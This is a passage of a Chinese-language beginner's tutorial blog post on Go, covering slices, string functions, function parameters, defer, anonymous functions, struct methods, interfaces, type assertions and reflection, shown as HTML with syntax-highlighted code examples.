class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br><span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> a &#123;<br>fmt.Println(i, v)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>数组可以直接打印</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>ints := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<span class="hljs-comment">//这是一个切片，没有固定的大小，像vector</span><br>    ints2 := [<span class="hljs-number">12</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>&#125;<span class="hljs-comment">//这是一个数组</span><br><br>log.Println(ints)<br>&#125;<br></code></pre></td></tr></table></figure><p>打印结果</p><p><code>[1 2 3 4 5]</code></p></li><li><p>字符串</p><ol><li><p>字符串的创建和转换</p><ul><li><code>str := &quot;hello&quot;</code>：使用双引号或反引号创建字符串。</li><li><code>str := string([]byte&#123;&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;&#125;)</code>：将字符切片转换为字符串。</li><li><code>str := strconv.Itoa(123)</code>：将整数转换为字符串。</li></ul></li><li><p>字符串的长度和索引</p><ul><li><code>len(str)</code>：获取字符串的长度（单位为字节）。</li><li><code>str[index]</code>：获取指定索引位置的字符。</li></ul></li><li><p>字符串的拼接和分割</p><ul><li><code>str := str1 + str2</code>：将两个字符串拼接起来。</li><li><code>strings.Join(strs []string, sep string) string</code>：将多个字符串拼接成一个字符串，中间用 <code>sep</code> 分隔。</li><li><code>strings.Split(str string, sep string) []string</code>：将字符串按照 <code>sep</code> 分割成多个子串，返回一个字符串切片。</li></ul></li><li><p>字符串的查找、比较和替换</p><ul><li><code>strings.Contains(str string, substr string) bool</code>：判断字符串 <code>str</code> 是否包含子串 <code>substr</code>。</li><li><code>strings.Index(str string, substr string) int</code>：返回子串 <code>substr</code> 在字符串 <code>str</code> 中第一次出现的位置，若不存在则返回 <code>-1</code>。</li><li><code>strings.Replace(str string, old string, new string, n int) string</code>：将字符串中的 <code>old</code> 替换为 <code>new</code>，如果指定了 <code>n</code>，则最多替换 <code>n</code> 次。</li></ul></li><li><p>字符串的转换和格式化</p><ul><li><code>strconv.Atoi(str string) (int, error)</code>：将字符串转换为整数。</li><li><code>strconv.ParseFloat(str string, bitSize int) (float64, error)</code>：将字符串转换为浮点数。</li><li><code>fmt.Sprintf(format string, a ...interface&#123;&#125;) string</code>：类似于 <code>Printf</code>，但是返回一个字符串，而不是将结果输出到标准输出。</li></ul></li></ol></li></ol><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/%E9%83%A8%E5%88%86%E5%88%AB%E5%90%8D.png"></p><ol><li><p>一个加法函数</p><p>多注意参数列表的省略</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> a + b<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>一个传址的函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add2</span><span class="hljs-params">(a, b *<span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> *a + *b<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>形式参数，和实际参数</p><p>形式参数：函数的参数列表</p><p>实际参数：调用函数时传的参数</p></li><li><p>可变参数列表</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add3</span><span class="hljs-params">(args ...<span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>SUM := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> args &#123;<br>SUM += v<br>&#125;<br><span class="hljs-keyword">return</span> SUM<br>&#125;<br>  <br></code></pre></td></tr></table></figure><ul><li><p>可以使用len()计算可变参数长度</p></li><li><p>每一个函数只能写一个一个可变参数</p></li><li><p><code>any</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> ANY any<br></code></pre></td></tr></table></figure></li></ul></li><li><p>参数的传递</p><ul><li><p>值传递</p><p>基础数据类型，array，struct</p><p>注意使用传递数组的时候，我们需要将形参的数组的的的大小和实参数组的大小同一</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(ints [3]<span class="hljs-type">int</span>)</span></span> &#123;<br>fmt.Println(ints)<br>ints[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span><br>fmt.Println(ints)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ints2 := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; <span class="hljs-comment">//这是一个数组</span><br>fmt.Println(ints2)<br>test(ints2)<br>fmt.Println(ints2)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果：</p><blockquote><p>[1 2 3]<br>[1 2 3]<br>[100 2 3]<br>[1 2 3]</p></blockquote><p>可见没被更改</p></li><li><p>引用传递</p><p>切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(ints []<span class="hljs-type">int</span>)</span></span> &#123;<br>fmt.Println(ints)<br>ints[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span><br>fmt.Println(ints)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ints2 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; <span class="hljs-comment">//这是一个数组</span><br>fmt.Println(ints2)<br>test(ints2)<br>fmt.Println(ints2)<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>[1 2 3]<br>[1 2 3]<br>[100 2 3]<br>[100 2 3]</p></blockquote></li><li><p>直接传地址</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(ints *<span class="hljs-type">int</span>)</span></span> &#123;<br>fmt.Println(*ints)<br>*ints = <span class="hljs-number">100</span><br>fmt.Println(*ints)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ints2 := <span class="hljs-number">2</span><br>fmt.Println(ints2)<br>test(&amp;ints2)<br>fmt.Println(ints2)<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>2<br>2<br>100<br>100</p></blockquote></li></ul></li></ol><h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h3><ol><li>近者优先使用</li></ol><h3 id="函数的递归"><a href="#函数的递归" class="headerlink" title="函数的递归"></a>函数的递归</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">workOut</span><span class="hljs-params">(num <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">if</span> num &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> num + workOut(num<span class="hljs-number">-1</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(workOut(<span class="hljs-number">100</span>))<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="推迟（延迟）函数"><a href="#推迟（延迟）函数" class="headerlink" title="推迟（延迟）函数"></a>推迟（延迟）函数</h3><ol><li><p><code>defer</code> 修饰调用函数</p><p>表示在最后调用</p></li><li><p>如果有多条<code>defer</code>则defer语句会逆序调用，也就是类型栈，先声明的最后调用</p></li><li><p>表面上是最后执行，其实是顺序编译，放进调用栈，在这个时候就已经传参。所以出现多个<code>defer</code>时出现先调用后执行</p></li></ol><h3 id="函数的数据类型"><a href="#函数的数据类型" class="headerlink" title="函数的数据类型"></a>函数的数据类型</h3><ol><li><p>函数本身也是一个数据了类型，类似C语言的函数指针</p><p><code>func main() </code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>test()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%T&quot;</span>, test) <span class="hljs-comment">//打印函数的类型</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>func() </p></blockquote><p><code>func test() int </code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>test()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> <span class="hljs-type">int</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%T&quot;</span>, test) <span class="hljs-comment">//打印函数的类型</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>func() int</p></blockquote><p><code>func(int, int) (int, int)</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>test(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%T&quot;</span>, test) <span class="hljs-comment">//打印函数的类型</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>func(int, int) (int, int)</p></blockquote></li><li><p>类比函数指针</p></li></ol><h3 id="无名函数"><a href="#无名函数" class="headerlink" title="无名函数"></a>无名函数</h3><ol><li><p>通过函数类型进行函数赋值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> test2 <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)<br>test2 = test<br>test2(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%T&quot;</span>, test) <span class="hljs-comment">//打印函数的类型</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看成C语言的函数，或者c++的可调用对象</p></li><li><p>无名函数</p><p>相当于c++的lambda表达式</p><p>不写函数名，直接写<code>()</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> &#123;<br>fmt.Println(a, b)<br>fmt.Printf(<span class="hljs-string">&quot;this is lambda&quot;</span>)<br>&#125;(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>函数也可以当作函数的参数，就是回调函数</p></li><li><p>函数作为另一个函数的<code>return </code>，可以形成闭包结构</p></li></ol><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>&#x2F;&#x2F;没学懂</p><h3 id="结构体函数"><a href="#结构体函数" class="headerlink" title="结构体函数"></a>结构体函数</h3><ul><li><p>在func后面添加结构体</p><p>参考代码实例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>ids  <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Student)</span></span> getName() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> s.name<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Student)</span></span> getIds() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> s.ids<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="错误定义"><a href="#错误定义" class="headerlink" title="错误定义"></a>错误定义</h3><ol><li><p><code>import &quot;errors&quot;</code></p><p>errors.New(string)</p><p>返回错误的类型</p></li></ol><h3 id="获取时间"><a href="#获取时间" class="headerlink" title="获取时间"></a>获取时间</h3><ol><li><code>import &quot;time&quot;</code></li></ol><h3 id="数字的解析"><a href="#数字的解析" class="headerlink" title="数字的解析"></a>数字的解析</h3><ol><li><p><code>f, _ := strconv.ParseFloat(&quot;1.421&quot;, 64)</code></p></li><li><p><img src="C:\Users\12414\Desktop\hexo\source_posts\go\初始go.assets\image-20230512232257694.png"></p></li></ol><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="继承-amp-重载"><a href="#继承-amp-重载" class="headerlink" title="继承&amp;重载"></a>继承&amp;重载</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-keyword">type</span> Father1 <span class="hljs-keyword">struct</span> &#123;<br>    money <span class="hljs-type">string</span><br>    name  <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Father1)</span></span> SetName(name <span class="hljs-type">string</span>) &#123;<br>    this.name = name<br>&#125;<br><br><span class="hljs-keyword">type</span> Father2 <span class="hljs-keyword">struct</span> &#123;<br>    age        <span class="hljs-type">int</span><br>    matherName <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> Son <span class="hljs-keyword">struct</span> &#123;<br>    Father1<br>    Father2<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Son)</span></span> SetName(name <span class="hljs-type">string</span>) &#123;<br>    this.name = name<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    mySonZjy := Son&#123;<br>        Father1: Father1&#123;<span class="hljs-string">&quot;no money&quot;</span>, <span class="hljs-string">&quot;chg&quot;</span>&#125;,<br>        Father2: Father2&#123;<span class="hljs-number">19</span>, <span class="hljs-string">&quot; zjy&amp;chg&quot;</span>&#125;,<br>    &#125;<br>    fmt.Println(mySonZjy)<br><br>    mySonZjy.Father1.SetName(<span class="hljs-string">&quot;this father name&quot;</span>)<br>    fmt.Println(mySonZjy)<br>    mySonZjy.SetName(<span class="hljs-string">&quot;this is son name&quot;</span>)<br>    fmt.Println(mySonZjy)<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><ol><li><p>通过接口实现多态，也就是相当<code>c++</code>的纯虚基类</p></li><li><p>接口本质是一个指针</p></li><li><p>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 多态的实现</span><br><span class="hljs-keyword">type</span> Animal <span class="hljs-keyword">interface</span> &#123;<br>    <span class="hljs-comment">//只能有函数</span><br>    GetType() <span class="hljs-type">string</span><br>    GetColor() <span class="hljs-type">string</span><br>    <span class="hljs-comment">//kind string</span><br>    <span class="hljs-comment">//color string</span><br>&#125;<br>   <br><span class="hljs-keyword">type</span> Cat <span class="hljs-keyword">struct</span> &#123;<br>    kind  <span class="hljs-type">string</span><br>    color <span class="hljs-type">string</span><br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Cat)</span></span> GetType() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> this.kind<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Cat)</span></span> GetColor() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> this.color<br>&#125;<br>   <br><span class="hljs-keyword">type</span> Dog <span class="hljs-keyword">struct</span> &#123;<br>    kind  <span class="hljs-type">string</span><br>    color <span class="hljs-type">string</span><br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Dog)</span></span> GetType() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> this.kind<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Dog)</span></span> GetColor() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> this.color<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetAnimal</span><span class="hljs-params">(animal Animal)</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;color is:&quot;</span>, animal.GetColor())<br>    fmt.Println(<span class="hljs-string">&quot;type is :&quot;</span>, animal.GetType())<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    cat := Cat&#123;<span class="hljs-string">&quot;Cat&quot;</span>, <span class="hljs-string">&quot;blue&quot;</span>&#125;<br>    GetAnimal(&amp;cat)<br>   <br>    dog := Dog&#123;<br>        kind:  <span class="hljs-string">&quot;Dog&quot;</span>,<br>        color: <span class="hljs-string">&quot;yellow&quot;</span>,<br>    &#125;<br>    fmt.Println(dog)<br>    GetAnimal(&amp;dog)<br>&#125;<br>   <br>   <br></code></pre></td></tr></table></figure></li></ol><h3 id="万能类型"><a href="#万能类型" class="headerlink" title="万能类型"></a>万能类型</h3><ol><li><p><code>interface&#123;&#125;</code>相当于<code>void</code></p></li><li><p>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>    name <span class="hljs-type">string</span><br>    age  <span class="hljs-type">int</span><br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">function</span><span class="hljs-params">(arg <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>    fmt.Println(arg)<br>    fmt.Printf(<span class="hljs-string">&quot;and type is: %T \n&quot;</span>, arg)<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    person := Person&#123;<br>        name: <span class="hljs-string">&quot;chg&quot;</span>,<br>        age:  <span class="hljs-number">20</span>,<br>    &#125;<br>    <span class="hljs-keyword">var</span> f <span class="hljs-type">float32</span> = <span class="hljs-number">2.5</span><br>    function(<span class="hljs-number">2.4</span>)<br>    function(f)<br>    function(<span class="hljs-number">1</span>)<br>    function(person)<br>&#125;<br>   <br>   <br></code></pre></td></tr></table></figure></li><li><p>万能类型提供断言，可以查看是否是某种变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IsString</span><span class="hljs-params">(arg <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>    value, isString := arg.(<span class="hljs-type">string</span>)<br>    <span class="hljs-keyword">if</span> isString &#123;<br>        fmt.Println(value)<br>        fmt.Println(<span class="hljs-string">&quot;this is string&quot;</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Println(value) <span class="hljs-comment">//不是的话打印换行符</span><br>        fmt.Println(<span class="hljs-string">&quot;this not string&quot;</span>)<br>    &#125;<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    IsString(<span class="hljs-string">&quot;string&quot;</span>)<br>    IsString(<span class="hljs-number">3.4</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>变量里面的<code>pair</code></p><p>每一个变量都有一个<code>pair</code>于是可以对</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230621104506638.png"></p></li></ol><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><ol><li><p><code>reflect</code>包</p><p>提供了两个函数用于获取变量的<code>pair</code>从而获取到值和类型</p><p>这个用于对于未知类型变量的处理</p></li><li><p>结构体标签</p><ul><li><p>语法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span 